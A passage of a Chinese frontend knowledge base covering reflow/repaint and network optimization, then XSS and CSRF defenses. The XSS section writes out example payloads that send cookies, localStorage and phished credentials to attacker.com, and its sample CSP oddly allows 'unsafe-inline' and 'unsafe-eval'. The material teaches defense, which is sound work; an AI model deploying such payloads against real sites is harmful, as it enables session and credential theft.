\`\`\`javascript
// 触发回流的操作
// 1. 改变窗口大小
window.addEventListener('resize', () => {
  // 触发整个页面的回流
});

// 2. 改变元素尺寸
element.style.width = '200px'; // 触发回流
element.style.height = '100px'; // 触发回流

// 3. 获取布局属性（强制同步布局）
const width = element.offsetWidth; // 触发回流
const height = element.offsetHeight; // 触发回流

// ❌ 避免：读写交替导致布局抖动
for (let i = 0; i < elements.length; i++) {
  elements[i].style.width = elements[i].offsetWidth + 10 + 'px';
}

// ✅ 推荐：批量读取，批量写入
const widths = elements.map(el => el.offsetWidth);
elements.forEach((el, i) => {
  el.style.width = widths[i] + 10 + 'px';
});
\`\`\`

**绘制 (Paint)：**
绘制阶段将元素绘制到屏幕上，也称为重绘（Repaint）。绘制是在多个层（Layer）上进行的，每个层都是一个独立的位图。绘制过程包括：创建绘制记录列表、执行绘制命令、生成位图。重绘的代价相对回流较小，但频繁的重绘仍然会影响性能。触发重绘的操作包括：改变颜色、背景、边框、阴影等不影响布局的样式变化。

\`\`\`javascript
// 触发重绘的操作
element.style.color = 'red'; // 触发重绘
element.style.backgroundColor = 'blue'; // 触发重绘
element.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)'; // 触发重绘

// 重绘不会触发布局计算，性能开销较小
// 但如果元素在合成层上，重绘可能不会影响其他层
\`\`\`

**合成 (Compositing)：**
合成阶段将绘制的图层合成为最终图像。浏览器利用GPU加速，将多个层合成到一起。合成层的创建需要满足特定条件，如使用transform、opacity、will-change等CSS属性。合成层的优势是：层的更新不会影响其他层，动画更流畅。但创建过多的合成层会消耗GPU内存，需要权衡。

\`\`\`javascript
// 创建合成层的方法
// 1. 使用 transform（推荐）
.animated-element {
  transform: translateZ(0); /* 创建合成层 */
  /* 或 */
  transform: translate3d(0, 0, 0);
}

// 2. 使用 will-change（明确提示浏览器）
.animated-element {
  will-change: transform, opacity;
}

// 3. 使用 opacity 动画
.fade-element {
  opacity: 0.5;
  transition: opacity 0.3s;
}

// 4. 使用 CSS 滤镜（部分情况）
.blurred-element {
  filter: blur(5px);
}

// ❌ 避免：过度使用合成层
.every-element {
  transform: translateZ(0); /* 不推荐：消耗过多GPU内存 */
}
\`\`\`

### 回流与重绘优化

**回流 (Reflow)：**
回流是浏览器计算元素几何属性的过程，是渲染过程中最昂贵的操作。回流会影响整个渲染树或部分渲染树，触发条件包括：页面首次渲染、浏览器窗口大小改变、元素尺寸或位置改变、元素内容改变、字体大小改变、添加或删除元素、激活CSS伪类等。回流会阻塞主线程，导致页面卡顿，应该尽量减少回流的触发。

\`\`\`javascript
// 回流触发场景详解

// 1. 页面首次渲染 - 必然触发回流
document.body.innerHTML = '<div>New Content</div>';

// 2. 浏览器窗口大小改变
window.addEventListener('resize', handleResize);

// 3. 元素尺寸改变
element.style.width = '200px';
element.style.height = '100px';
element.style.padding = '10px';
element.style.margin = '20px';
element.style.border = '1px solid black';

// 4. 元素位置改变
element.style.top = '50px';
element.style.left = '100px';
element.style.transform = 'translate(10px, 20px)'; // 不触发回流（合成层）

// 5. 内容改变
element.textContent = 'New Text';
element.innerHTML = '<span>New HTML</span>';

// 6. 字体改变
element.style.fontSize = '16px';
element.style.fontFamily = 'Arial';

// 7. DOM 操作
parent.appendChild(child); // 触发回流
parent.removeChild(child); // 触发回流

// 8. 获取布局属性（强制同步布局）
const rect = element.getBoundingClientRect();
const width = element.offsetWidth;
const height = element.offsetHeight;
const top = element.offsetTop;
const left = element.offsetLeft;
const style = window.getComputedStyle(element);
\`\`\`

**重绘 (Repaint)：**
重绘是浏览器重新绘制元素视觉外观的过程，不涉及布局计算。重绘的代价相对回流较小，但频繁的重绘仍然会影响性能。触发重绘的操作包括：改变颜色、背景色、边框样式、阴影、透明度等不影响布局的样式变化。重绘不会触发布局计算，但如果元素在合成层上，重绘可能不会影响其他层。

\`\`\`javascript
// 重绘触发场景详解

// 1. 颜色改变 - 只触发重绘
element.style.color = 'red';
element.style.backgroundColor = 'blue';
element.style.borderColor = 'green';

// 2. 背景改变
element.style.backgroundImage = 'url(image.jpg)';
element.style.backgroundSize = 'cover';

// 3. 边框样式改变
element.style.borderStyle = 'dashed';
element.style.borderWidth = '2px';

// 4. 阴影改变
element.style.boxShadow = '0 0 10px rgba(0,0,0,0.5)';
element.style.textShadow = '1px 1px 2px black';

// 5. 透明度改变
element.style.opacity = '0.5';

// 6. visibility 改变（注意与 display:none 的区别）
element.style.visibility = 'hidden'; // 触发重绘，元素仍占据空间

// 对比：display:none 触发回流
element.style.display = 'none'; // 触发回流，元素不占据空间
\`\`\`

**回流与重绘的关系：**
回流必然导致重绘，但重绘不一定导致回流。回流是更昂贵的操作，因为它需要重新计算布局。优化策略应该是：尽量减少回流，将回流和重绘分离，利用合成层避免回流和重绘。

\`\`\`javascript
// 回流与重绘的关系示例

// 回流 + 重绘：改变元素尺寸
element.style.width = '200px'; // 先回流计算布局，再重绘

// 只重绘：改变元素颜色
element.style.color = 'red'; // 只重绘，不回流

// 都不触发：使用合成层
element.style.transform = 'translateX(100px)'; // 不回流不重绘，只合成
element.style.opacity = '0.5'; // 在合成层上，不回流不重绘

// 性能排序（从低到高）：
// 回流 + 重绘 < 重绘 < 合成
\`\`\`

### 优化策略详解

**减少回流策略：**
减少回流是浏览器渲染优化的核心。主要策略包括：使用CSS transform代替top/left/width/height、批量修改样式、使用DocumentFragment、避免频繁访问布局属性、使用will-change提示浏览器、避免使用table布局等。

\`\`\`javascript
// ❌ 避免：多次触发回流
element.style.width = '100px';
element.style.height = '100px';
element.style.margin = '10px';
element.style.padding = '10px';
// 每次样式修改都可能触发回流

// ✅ 推荐：批量修改样式
// 方法1：使用cssText
element.style.cssText = 'width: 100px; height: 100px; margin: 10px; padding: 10px;';

// 方法2：使用class
element.className = 'active';

// 方法3：使用requestAnimationFrame
function updateStyles() {
  requestAnimationFrame(() => {
    element.style.width = '100px';
    element.style.height = '100px';
  });
}

// ❌ 避免：使用top/left进行动画
.animated-element {
  position: absolute;
  top: 0;
  left: 0;
  transition: top 0.3s, left 0.3s;
}

// ✅ 推荐：使用transform进行动画
.animated-element {
  transform: translate(0, 0);
  transition: transform 0.3s;
}

// ❌ 避免：循环中操作DOM
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  document.body.appendChild(div); // 每次都触发回流
}

// ✅ 推荐：使用DocumentFragment
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  fragment.appendChild(div);
}
document.body.appendChild(fragment); // 只触发一次回流

// ❌ 避免：频繁获取布局属性
for (let i = 0; i < elements.length; i++) {
  elements[i].style.width = elements[i].offsetWidth + 10 + 'px';
  // 每次循环都触发回流（布局抖动）
}

// ✅ 推荐：批量读取，批量写入
const widths = [];
for (let i = 0; i < elements.length; i++) {
  widths[i] = elements[i].offsetWidth; // 先批量读取
}
for (let i = 0; i < elements.length; i++) {
  elements[i].style.width = widths[i] + 10 + 'px'; // 再批量写入
}
\`\`\`

**减少重绘策略：**
减少重绘的策略包括：避免使用CSS expressions、合理使用visibility代替display、减少CSS渐变和阴影、优化选择器性能、避免频繁修改样式等。

\`\`\`javascript
// ❌ 避免：频繁修改样式
setInterval(() => {
  element.style.backgroundColor = getRandomColor();
}, 100);

// ✅ 推荐：使用CSS动画
@keyframes colorChange {
  0% { background-color: red; }
  50% { background-color: green; }
  100% { background-color: blue; }
}

.animated-element {
  animation: colorChange 3s infinite;
}

// ❌ 避免：复杂的CSS选择器
.container .content .item .title .text {
  color: red;
}

// ✅ 推荐：简洁的CSS选择器
.item-text {
  color: red;
}

// ❌ 避免：过度使用渐变和阴影
.heavy-element {
  background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
  box-shadow: 0 10px 30px rgba(0,0,0,0.3), 0 5px 15px rgba(0,0,0,0.2);
  text-shadow: 2px 2px 4px rgba(0,0,0,0.5);
}

// ✅ 推荐：适度使用视觉效果
.light-element {
  background: #667eea;
  box-shadow: 0 2px 10px rgba(0,0,0,0.1);
}
\`\`\`

**利用合成层：**
合成层是浏览器渲染优化的高级技巧。通过创建独立的合成层，可以将元素的更新与其他层隔离，避免回流和重绘。创建合成层的方法包括：使用transform: translateZ(0)、使用will-change属性、使用opacity动画等。但需要注意，过多的合成层会消耗GPU内存。

\`\`\`javascript
// 创建合成层的场景

// 1. 动画元素
.animated-box {
  will-change: transform;
  transform: translateZ(0);
}

// 2. 固定定位元素
.fixed-header {
  position: fixed;
  will-change: transform;
}

// 3. 滚动容器
.scroll-container {
  overflow: auto;
  will-change: transform;
  -webkit-overflow-scrolling: touch;
}

// 4. 视频和Canvas
.video-container {
  transform: translateZ(0);
}

// 监控合成层
// Chrome DevTools -> More Tools -> Layers
// 可以查看所有合成层及其内存占用

// ❌ 避免：过度使用will-change
* {
  will-change: transform; /* 不推荐：消耗大量GPU内存 */
}

// ✅ 推荐：按需使用will-change
.animated-on-hover:hover {
  will-change: transform;
}
\`\`\`

**CSS优化策略：**
CSS优化包括：避免使用@import、减少CSS选择器复杂度、使用CSS变量、合理使用inline CSS、优化CSS继承等。

\`\`\`javascript
// ❌ 避免：使用@import（阻塞渲染）
@import url('styles.css');

// ✅ 推荐：使用link标签
<link rel="stylesheet" href="styles.css">

// ❌ 避免：深层嵌套选择器
.page .section .container .row .col .item .title {
  font-size: 16px;
}

// ✅ 推荐：扁平化选择器
.item-title {
  font-size: 16px;
}

// ✅ 推荐：使用CSS变量
:root {
  --primary-color: #007bff;
  --font-size-base: 16px;
}

.button {
  background-color: var(--primary-color);
  font-size: var(--font-size-base);
}

// ✅ 推荐：关键CSS内联
<head>
  <style>
    /* 关键CSS直接内联 */
    .header { height: 60px; }
    .hero { min-height: 400px; }
  </style>
</head>
<body>
  <!-- 内容 -->
  <link rel="preload" href="styles.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
</body>
\`\`\`

**JavaScript优化策略：**
JavaScript优化包括：避免在布局期间修改样式、使用requestAnimationFrame处理动画、避免频繁操作DOM、使用虚拟列表处理大量数据、优化事件处理等。

\`\`\`javascript
// ❌ 避免：在布局期间修改样式
function updateLayout() {
  element.style.width = '100px';
  const height = element.offsetHeight; // 强制同步布局
  element.style.height = height + 'px';
}

// ✅ 推荐：使用requestAnimationFrame
function updateLayout() {
  requestAnimationFrame(() => {
    element.style.width = '100px';
    requestAnimationFrame(() => {
      const height = element.offsetHeight;
      element.style.height = height + 'px';
    });
  });
}

// ❌ 避免：频繁操作DOM
items.forEach(item => {
  const li = document.createElement('li');
  li.textContent = item;
  list.appendChild(li);
});

// ✅ 推荐：使用虚拟列表（大数据量）
class VirtualList {
  constructor(container, itemHeight, renderItem) {
    this.container = container;
    this.itemHeight = itemHeight;
    this.renderItem = renderItem;
    this.visibleItems = Math.ceil(container.clientHeight / itemHeight);
    this.init();
  }
  
  init() {
    this.container.addEventListener('scroll', this.onScroll.bind(this));
  }
  
  onScroll() {
    const scrollTop = this.container.scrollTop;
    const startIndex = Math.floor(scrollTop / this.itemHeight);
    this.render(startIndex);
  }
  
  render(startIndex) {
    const fragment = document.createDocumentFragment();
    for (let i = startIndex; i < startIndex + this.visibleItems; i++) {
      const item = this.renderItem(i);
      fragment.appendChild(item);
    }
    this.container.innerHTML = '';
    this.container.appendChild(fragment);
  }
}

// ✅ 推荐：使用Intersection Observer懒加载
const observer = new IntersectionObserver((entries) => {
  entries.forEach(entry => {
    if (entry.isIntersecting) {
      entry.target.src = entry.target.dataset.src;
      observer.unobserve(entry.target);
    }
  });
});

document.querySelectorAll('img[data-src]').forEach(img => {
  observer.observe(img);
});
\`\`\`

### 工具与监控

**性能分析工具：**
- Chrome DevTools Performance 面板
- Lighthouse
- WebPageTest
- Chrome DevTools Rendering 面板

**监控指标：**
- 首次绘制 (FP)
- 首次内容绘制 (FCP)
- 最大内容绘制 (LCP)
- 累积布局偏移 (CLS)
- 首次输入延迟 (FID)

### 最佳实践

- 理解渲染流程
- 减少回流和重绘
- 利用合成层
- 优化 CSS 和 JavaScript
- 使用性能分析工具
- 监控关键指标
- 持续优化和测试
- 考虑不同设备和浏览器`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"network-optimization",title:"网络请求优化",category:"performance",difficulty:"medium",tags:["性能优化","网络请求","HTTP/2","缓存策略"],content:`## 网络请求优化

网络请求是前端性能的关键瓶颈，优化网络请求可以显著提升页面加载速度和用户体验。

### HTTP 协议优化

**HTTP/2：**
- 多路复用：一个连接处理多个请求：HTTP/2引入的多路复用特性允许在单个TCP连接上同时传输多个请求和响应数据，突破了HTTP/1.1的队头阻塞问题，在HTTP/1.1中浏览器通常只能并发6个请求，而HTTP/2可以在一个连接上并发传输任意数量的请求，大幅提高了页面资源的并行下载能力，是HTTP/2性能提升的核心特性
- 服务器推送：主动推送资源：HTTP/2的服务器推送允许服务器在客户端请求某个资源时，主动将相关资源推送到客户端缓存中，当浏览器需要这些资源时可以直接从缓存使用，无需等待请求，例如当浏览器请求HTML页面时，服务器可以主动推送相关的CSS、JavaScript和图片资源，减少后续请求的延迟，服务器推送可以显著减少首屏加载时间
- 头部压缩：减少头部大小：HTTP/2使用HPACK算法对请求和响应头部进行压缩，包括静态表（常见的头部字段）、动态表（当前连接中出现的头部字段）和哈夫曼编码，显著减少了头部传输的数据量，在HTTP/1.1中每个请求都需要携带完整的Cookie、User-Agent等头部，而HTTP/2只需要传输头部索引，大幅减少了网络传输开销
- 二进制分帧：更高效的数据传输：HTTP/2将数据分割成更小的帧进行传输，每个帧都有帧头标识其所属的流（请求/响应），相比HTTP/1.1的文本格式，二进制格式解析更高效，错误更少，二进制分帧是多路复用的基础，允许在单个连接上并发传输多个请求和响应，同时保持顺序正确，是HTTP/2高性能的重要基础

**HTTP/3：**
- 基于 QUIC 协议
- 更快的连接建立
- 更好的拥塞控制
- 更强的可靠性

**HTTPS：**
- 加密传输
- 提高安全性
- 搜索引擎排名优势
- 浏览器信任度高

### 缓存策略

**强缓存：**
- Cache-Control 响应头
- Expires 响应头
- 不需要向服务器发起请求
- 直接使用缓存资源

**协商缓存：**
- ETag 响应头
- Last-Modified 响应头
- 向服务器发起请求验证资源是否过期
- 未过期则使用缓存

**缓存策略选择：**
- 静态资源：长缓存时间：对于不经常变化的静态资源如JavaScript、CSS、图片、字体等，应该设置较长的缓存时间（如一年），通过Cache-Control: max-age=31536000响应头实现，这样浏览器在首次加载后会缓存这些资源，后续访问直接从缓存读取，显著减少加载时间，通常配合文件名哈希（content hashing）实现缓存更新，当文件内容变化时生成新的哈希值，文件名变化后浏览器会重新请求
- 动态资源：协商缓存：对于经常变化的动态资源如HTML页面、API数据等，应该使用协商缓存策略，通过ETag或Last-Modified响应头让浏览器在后续请求时验证资源是否更新，浏览器发送If-None-Match或If-Modified-Since请求头，服务器判断资源是否变化，未变化返回304状态码使用缓存，变化则返回新资源，协商缓存可以在保证内容新鲜度的同时减少数据传输
- 关键资源：预加载：对于首屏渲染必需的关键资源如关键CSS、关键JavaScript、首屏图片等，应该使用preload预加载，让浏览器提前开始下载，避免渲染阻塞，preload可以设置正确的资源优先级，确保关键资源优先下载，通常将首屏必需的CSS内联到HTML中，JavaScript使用defer或async加载，避免阻塞HTML解析
- 非关键资源：延迟加载：对于非首屏必需的资源如图片、JavaScript模块、组件等，应该使用懒加载策略延迟加载，图片使用loading="lazy"属性或Intersection Observer API实现懒加载，JavaScript使用动态import()语法进行代码分割和按需加载，延迟加载可以减少首屏加载时间，加快首次内容绘制，让用户更快看到页面内容

### 请求优化

**减少请求数量：**
- 资源合并：CSS/JS 合并
- 精灵图：合并小图标
- 内联关键 CSS
- 减少第三方脚本

**减少请求大小：**
- 压缩资源：gzip、brotli
- 最小化 CSS/JS/HTML
- 优化图片：WebP、压缩
- 移除不必要的代码

**请求优先级：**
- 预加载关键资源
- 延迟加载非关键资源
- 合理使用资源提示
- 优化请求顺序

### CDN 与边缘计算

**CDN：**
- 内容分发网络
- 就近访问资源
- 提高加载速度
- 减轻源服务器负担

**边缘计算：**
- 在边缘节点处理请求
- 减少延迟
- 提高响应速度
- 适合动态内容

### 连接优化

**DNS 优化：**
- DNS 预解析
- 减少 DNS 查询时间
- 使用可靠的 DNS 提供商
- 合理设置 DNS TTL

**TCP 优化：**
- 启用 TCP 快速打开
- 优化 TCP 窗口大小
- 减少 TCP 连接建立时间
- 使用 HTTP 持久连接

**TLS 优化：**
- 启用 TLS 会话复用
- 使用 TLS 1.3
- 减少 TLS 握手时间
- 优化证书链

### 监控与分析

**网络监控：**
- Chrome DevTools Network 面板
- WebPageTest
- Lighthouse
- New Relic

**关键指标：**
- DNS 解析时间
- TCP 连接时间
- TLS 握手时间
- 首字节时间 (TTFB)
- 内容传输时间
- 总加载时间

### 最佳实践

- 升级到 HTTP/2 或 HTTP/3
- 实现合理的缓存策略
- 减少请求数量和大小
- 使用 CDN 分发静态资源
- 优化 DNS 和 TCP 连接
- 监控网络性能
- 持续优化和测试
- 考虑不同网络环境`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"xss-prevention",title:"XSS 攻击与防护",category:"security",difficulty:"medium",tags:["前端安全","XSS","跨站脚本攻击","防护策略"],content:`## XSS 攻击与防护

XSS (Cross-Site Scripting) 是一种常见的前端安全漏洞，攻击者通过注入恶意脚本到网页中，当用户浏览该页面时，恶意脚本会在用户的浏览器中执行。

### 🛡️ XSS 攻击类型

**存储型 XSS：**
- **恶意脚本被存储在服务器数据库中**
- **当其他用户访问包含该脚本的页面时触发**
- **常见于论坛、评论系统、社交网络**
- **危害较大，影响范围广**

**反射型 XSS：**
- **恶意脚本通过 URL 参数传递**
- **服务器将参数反射回浏览器执行**
- **常见于搜索、错误页面**
- **通常需要用户点击恶意链接**

**DOM 型 XSS：**
- **恶意脚本在客户端执行**
- **不经过服务器**
- **利用 DOM 操作漏洞**
- **直接在浏览器中执行**

### 💻 代码示例：XSS 攻击演示

\`\`\`javascript
// 存储型 XSS
// 恶意评论
const maliciousComment = '<script>alert("XSS")</script>';
// 存储到数据库
saveComment(maliciousComment);

// 其他用户访问时
function displayComments() {
  comments.forEach(comment => {
    // 不安全的渲染
    document.getElementById('comments').innerHTML = comment;
  });
}

// 反射型 XSS
// 恶意 URL
const maliciousURL = 'https://example.com/search?q=<script>alert("XSS")</script>';
// 服务器反射
function search(q) {
  return \`Search results for: \${q}\`;
}

// DOM 型 XSS
// 不安全的 DOM 操作
function updateContent() {
  const userInput = getUserInput();
  document.getElementById('content').innerHTML = userInput;
}

// 恶意输入
const maliciousInput = '<img src=x onerror="alert('XSS')">';
updateContent(maliciousInput);
\`\`\`

### XSS 攻击危害

**数据窃取：**
- 窃取用户 cookie
- 窃取会话令牌
- 窃取用户敏感信息
- 钓鱼攻击

**会话劫持：**
- 冒充用户身份
- 执行未授权操作
- 访问用户账户
- 修改用户数据

**网站破坏：**
- 篡改网页内容
- 重定向到恶意网站
- 植入恶意广告
- 影响网站声誉

**拒绝服务：**
- 消耗浏览器资源
- 导致页面崩溃
- 影响用户体验
- 可能影响服务器

### 代码示例

#### 数据窃取示例

\`\`\`javascript
// 窃取 Cookie
const maliciousScript = \`
  <script>
    // 窃取所有 cookie
    const cookies = document.cookie;
    
    // 发送到攻击者服务器
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({ cookies }),
      headers: { 'Content-Type': 'application/json' }
    });
  </script>
\`;

// 窃取本地存储
const stealLocalStorage = \`
  <script>
    const localStorageData = {};
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      localStorageData[key] = localStorage.getItem(key);
    }
    
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify({ localStorageData }),
      headers: { 'Content-Type': 'application/json' }
    });
  </script>
\`;

// 钓鱼攻击
const phishingScript = \`
  <script>
    // 创建虚假登录表单
    const fakeForm = document.createElement('form');
    fakeForm.method = 'POST';
    fakeForm.action = 'https://attacker.com/steal-credentials';
    
    const usernameInput = document.createElement('input');
    usernameInput.name = 'username';
    usernameInput.placeholder = 'Username';
    
    const passwordInput = document.createElement('input');
    passwordInput.name = 'password';
    passwordInput.type = 'password';
    passwordInput.placeholder = 'Password';
    
    const submitButton = document.createElement('button');
    submitButton.type = 'submit';
    submitButton.textContent = 'Login';
    
    fakeForm.appendChild(usernameInput);
    fakeForm.appendChild(passwordInput);
    fakeForm.appendChild(submitButton);
    
    document.body.appendChild(fakeForm);
  </script>
\`;
\`\`\`

### XSS 防护策略

**输入验证：**
- 对用户输入进行过滤
- 限制输入长度
- 验证输入格式
- 转义特殊字符

**输出编码：**
- HTML 实体编码：HTML实体编码是将特殊字符转换为HTML实体表示的方法，如小于号<转换为&lt;、大于号>转换为&gt;、引号"转换为&quot;等，可以防止用户输入被解析为HTML代码，是防御XSS攻击的最基本方法，在将用户输入插入到HTML页面中时必须进行HTML实体编码，大多数现代前端框架默认会自动进行HTML编码
- JavaScript 编码：当用户输入需要插入到JavaScript代码中时，需要进行JavaScript编码，将特殊字符转换为Unicode转义序列，如单引号'转换为\\u0027、双引号"转换为\\u0022等，JavaScript编码可以防止用户输入突破字符串边界被执行，是防止XSS攻击的重要组成部分，在动态生成JavaScript代码时必须使用
- CSS 编码：当用户输入需要插入到CSS属性值中时，需要进行CSS编码，将特殊字符转换为CSS转义序列，如反斜杠\\转换为\\\\、换行转换为\\A等，CSS编码可以防止用户输入突破CSS属性值边界注入新的CSS规则或JavaScript，是防止XSS和CSS注入攻击的重要手段
- URL 编码：URL编码（Percent-encoding）是将特殊字符转换为URL安全格式的方法，将字符转换为%XX格式的十六进制表示，如空格转换为%20、中文转换为UTF-8编码的%XX格式等，URL编码用于将用户输入安全地插入到URL的查询参数或路径中，防止URL注入和参数污染攻击

**内容安全策略 (CSP)：**
- 限制脚本执行来源
- 禁止内联脚本
- 禁止 eval() 等危险函数
- 配置 report-uri 监控攻击

**HTTP Only Cookie：**
- 防止 JavaScript 访问 cookie
- 减少 cookie 被窃取的风险
- 提高会话安全性

**现代框架防护：**
- React：自动转义内容：React框架默认会对JSX中的内容进行HTML转义，防止XSS攻击，当使用{userInput}插入用户输入时，React会自动将特殊字符转换为HTML实体，只有使用dangerouslySetInnerHTML时需要手动处理转义，这是React的安全特性之一，但开发者仍需注意不要使用用户输入来构建动态组件名或属性名
- Vue：v-html 指令的安全使用：Vue的v-html指令用于渲染HTML内容，但存在XSS风险，因为v-html不会对HTML内容进行转义，如果HTML内容包含恶意脚本，可能会被执行，使用v-html时应该确保内容来源可信，或者使用DOMPurify等库对HTML进行净化，避免直接渲染用户输入的HTML内容
- Angular：内置 XSS 防护：Angular框架内置了强大的XSS防护机制，默认对所有数据绑定进行转义处理，Angular的编译器会对模板进行严格的安全检查，阻止危险的绑定方式，Angular还提供了DomSanitizer服务用于安全地处理需要插入原始HTML的场景，使用bypassSecurityTrustHtml等方法时必须确保内容已经过适当清理
- 使用框架提供的安全 API

### 代码示例

#### 输入验证示例

\`\`\`javascript
// 使用 DOMPurify 清理 HTML
import DOMPurify from 'dompurify';

function sanitizeHTML(html) {
  return DOMPurify.sanitize(html, {
    ALLOWED_TAGS: ['p', 'br', 'strong', 'em'],
    ALLOWED_ATTR: []
  });
}

// 使用示例
const userInput = '<script>alert("XSS")</script><p>Hello</p>';
const cleanHTML = sanitizeHTML(userInput);
console.log(cleanHTML); // '<p>Hello</p>'

// 验证输入格式
function validateInput(input, type) {
  const patterns = {
    email: /^[^s@]+@[^s@]+.[^s@]+$/,
    url: /^https?://.+/,
    username: /^[a-zA-Z0-9_]{3,20}$/
  };
  
  return patterns[type].test(input);
}

// 限制输入长度
function truncateInput(input, maxLength) {
  return input.length > maxLength ? input.substring(0, maxLength) : input;
}

// 使用示例
const email = 'user@example.com';
if (validateInput(email, 'email')) {
  console.log('Valid email');
} else {
  console.log('Invalid email');
}
\`\`\`

#### 输出编码示例

\`\`\`javascript
// HTML 实体编码
function encodeHTML(str) {
  return str.replace(/[&<>"']/g, function(m) {
    return {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    }[m];
  });
}

// JavaScript 编码
function encodeJS(str) {
  return str.replace(/[\\u0000-\\uFFFF]/g, function(m) {
    return '\\\\u' + ('0000' + m.charCodeAt(0).toString(16)).slice(-4);
  });
}

// URL 编码
function encodeURL(str) {
  return encodeURIComponent(str);
}

// 使用示例
const userInput = '<script>alert("XSS")</script>';
const safeHTML = encodeHTML(userInput);
console.log(safeHTML); // '&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;'

// React 自动转义
function ReactComponent({ content }) {
  // React 自动转义 content
  return <div>{content}</div>;
}

// 使用 dangerouslySetInnerHTML（不推荐）
function UnsafeComponent({ content }) {
  // 不安全，需要手动转义
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}

// 安全使用 dangerouslySetInnerHTML
function SafeComponent({ content }) {
  const cleanHTML = DOMPurify.sanitize(content);
  return <div dangerouslySetInnerHTML={{ __html: cleanHTML }} />;
}
\`\`\`

#### CSP 配置示例

\`\`\`html
<!-- HTTP 头配置 -->
<meta http-equiv="Content-Security-Policy" content="
  default-src 'self';
  script-src 'self' 'unsafe-inline' 'unsafe-eval' https://trusted.cdn.com;
  style-src 'self' 'unsafe-inline' https://trusted.cdn.com;
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://trusted.cdn.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  report-uri /csp-report
">

<!-- 服务器配置示例 -->
<!-- Nginx -->
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' https://trusted.cdn.com;
  style-src 'self' https://trusted.cdn.com;
  img-src 'self' data: https:;
  connect-src 'self' https://api.example.com;
  font-src 'self' https://trusted.cdn.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  report-uri /csp-report
";

<!-- Express.js -->
app.use(helmet.contentSecurityPolicy({
  directives: {
    defaultSrc: ["'self'"],
    scriptSrc: ["'self'", "https://trusted.cdn.com"],
    styleSrc: ["'self'", "https://trusted.cdn.com"],
    imgSrc: ["'self'", "data:", "https:"],
    connectSrc: ["'self'", "https://api.example.com"],
    fontSrc: ["'self'", "https://trusted.cdn.com"],
    objectSrc: ["'none'"],
    baseUri: ["'self'"],
    formAction: ["'self'"],
    frameAncestors: ["'none'"],
    reportUri: "/csp-report"
  }
}));
\`\`\`

#### HTTP Only Cookie 示例

\`\`\`javascript
// 设置 HTTP Only Cookie
res.cookie('sessionId', sessionId, {
  httpOnly: true,  // 防止 JavaScript 访问
  secure: true,    // 只通过 HTTPS 传输
  sameSite: 'strict',  // 防止 CSRF 攻击
  maxAge: 3600000,  // 1 小时过期
  path: '/'
});

// Express.js 示例
app.use(session({
  secret: 'your-secret-key',
  cookie: {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'strict',
    maxAge: 3600000
  }
}));

// Next.js 示例
export async function setSessionCookie(res, sessionId) {
  res.setHeader('Set-Cookie', [
    \`sessionId=\${sessionId}; HttpOnly; Secure; SameSite=Strict; Path=/; Max-Age=3600\`
  ]);
}
\`\`\`

### 防护最佳实践

- 始终对用户输入进行验证和清理
- 使用框架提供的安全 API，避免手动拼接 HTML
- 配置严格的 CSP 策略
- 使用 HTTP Only 和 Secure Cookie
- 定期进行安全审计和渗透测试
- 保持依赖库的更新
- 使用安全的第三方库
- 实施内容安全策略监控
- 教育开发团队安全意识

`,createdAt:"2026-03-14",updatedAt:"2026-03-14"},{id:"csrf-prevention",title:"CSRF 攻击与防护",category:"security",difficulty:"medium",tags:["前端安全","CSRF","跨站请求伪造","防护策略"],content:`## CSRF 攻击与防护

CSRF (Cross-Site Request Forgery) 是一种常见的网络攻击，攻击者诱导用户在已登录的 web 应用上执行非预期的操作。

### CSRF 攻击原理

**攻击流程：**
- 用户登录目标网站 A，获取会话 cookie
- 攻击者诱导用户访问恶意网站 B
- 恶意网站 B 向网站 A 发送请求
- 浏览器自动携带用户的 cookie
- 网站 A 误认为是用户的合法操作
- 执行攻击者指定的操作

**攻击条件：**
- 用户已登录目标网站
- 目标网站存在 CSRF 漏洞
- 用户被诱导访问恶意网站
- 请求不需要额外的验证

### CSRF 攻击危害

**未授权操作：**
- 修改用户密码
- 转账操作
- 发表恶意内容
- 更改用户设置

**数据泄露：**
- 窃取用户信息
- 访问敏感数据
- 破坏数据完整性
- 影响系统安全

**账户接管：**
- 完全控制用户账户
- 执行任意操作
- 长期访问权限
- 难以检测

**业务影响：**
- 声誉损失
- 用户信任下降
- 法律责任
- 经济损失

### CSRF 防护策略

**CSRF Token：**
- 生成随机 token
- 存储在 session 中
- 在表单中包含 token
- 验证请求中的 token

**SameSite Cookie：**
- 设置 SameSite 属性
- 限制 cookie 跨站发送
- 可选值：Strict、Lax、None
- 现代浏览器支持

**Referer 验证：**
- 检查 HTTP Referer 头
- 验证请求来源
- 防止跨站请求
- 作为辅助防护

**Origin 验证：**
- 检查 HTTP Origin 头
- 更可靠的来源验证
- 不受 Referer 限制
- 现代浏览器支持

**双重提交 Cookie：**
- 将 token 存储在 cookie 中
- 在请求中包含 token
- 验证两者是否匹配
- 适合单页应用

### 防护最佳实践

**前端防护：**
- 包含 CSRF token 在请求中
- 使用框架提供的 CSRF 防护
- 避免使用 GET 请求修改数据
- 验证请求来源

**后端防护：**
- 实现 CSRF token 验证
- 设置 SameSite cookie
- 验证 Referer/Origin 头
- 对敏感操作额外验证

**安全设计：**
- 使用 POST/PUT/DELETE 而非 GET
- 实现请求限速
- 敏感操作二次验证
- 定期安全审计

**监控与响应：**
- 监控异常请求模式
- 及时响应安全事件
- 修复漏洞
- 通知用户

### 工具与资源

**安全扫描工具：**
